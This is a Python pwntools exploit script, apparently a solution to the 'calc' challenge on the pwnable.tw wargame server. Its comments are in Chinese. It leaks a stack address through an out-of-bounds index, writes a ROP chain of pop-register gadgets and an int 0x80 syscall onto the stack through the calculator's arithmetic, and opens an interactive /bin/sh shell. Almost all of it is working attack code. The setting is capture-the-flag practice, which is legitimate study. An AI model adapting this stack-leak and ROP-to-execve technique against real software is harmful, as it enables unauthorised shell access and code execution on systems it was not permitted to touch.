#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
使用 int 0x80 调用 execve('/bin/sh') 获取shell
int 0x80 (eax=11, ebx=addr('/bin/sh'), ecx=0, edx=0)
注意：execve必须使用绝对路径
"""

import sys
from pwn import *

DEBUG = 0

class BaseCfg:
    POP_EAX_RET = 0x0805c34b  # 0x0805c34b: pop eax ; ret  ;
    POP_ECX_EBX_RET = 0x080701d1  # 0x080701d1: pop ecx ; pop ebx ; ret  ;
    POP_EDX_RET = 0x080701aa  # 0x080701aa: pop edx ; ret  ;
    INT_0X80 = 0x08049a21  # 0x08049a21: int 0x80 ;

    def __init__(self):
        context(arch='i386', os='linux')
        context.log_level = 'debug'

        
class DebugCfg(BaseCfg):
    def __init__(self):
        BaseCfg.__init__(self)
        self.host = '127.0.0.1'
        self.port = 4444


class RealCfg(BaseCfg):
    def __init__(self):
        BaseCfg.__init__(self)
        context.log_level = 'info'
        self.host = 'chall.pwnable.tw'
        self.port = 10100


def main():
    cfg = DebugCfg() if DEBUG else RealCfg()
    io = remote(cfg.host, cfg.port)
    log.info(io.recv())
    # addr of '/bin/sh'
    # raw_input('wait debug')
    io.sendline('+360')
    main_ebp = int(io.recv())
    main_ebp_disp = main_ebp if main_ebp > 0 else 0x100000000 + main_ebp
    log.success('main_ebp = %s', '0x{:08X}'.format(main_ebp_disp))
    # mstacksize = main_ebp - (main_ebp & 0xFFFFFFF0 - 16)
    sh_addr = main_ebp + (8 - (24 / 4 + 1)) * 4
    sh_addr_disp = sh_addr if sh_addr > 0 else 0x100000000 + sh_addr
    log.success('sh_addr = %s', '0x{:08X}'.format(sh_addr_disp))

    # raw_input('wait debug')

    vals = (
        cfg.POP_EAX_RET, 11,
        cfg.POP_EDX_RET, 0,
        cfg.POP_ECX_EBX_RET, 0, sh_addr,
        cfg.INT_0X80,
        0x6e69622f, 0x0068732f,  # /bin/sh\x00
    )
    # stack overflow
    start = 361
    for idx, val in enumerate(vals):
        io.sendline('+' + str(start + idx))
        memval = int(io.recv())
        log.debug('orig mem val = %s', '0x{:08X}'.format(memval))
        log.debug('target mem val = %s', '0x{:08X}'.format(val))
        diff = val - memval
        payload = '+' + str(start + idx)
        if diff < 0:
            payload += str(diff)
        else:
            payload += '+' + str(diff)
        log.info('payload = %s', payload)
        io.sendline(payload)
        result = int(io.recv())
        result_disp = result if result >= 0 else 0x100000000 + result
        log.debug('%d = %s', start + idx, '0x{:08X}'.format(val))
        if result != val:
            log.error('result = %d, val = %d', result, val)
            sys.exit(-1)
    io.send('Merry Christmas!')
    io.interactive('\nshell# ')
    io.close()


if __name__ == '__main__':
    main()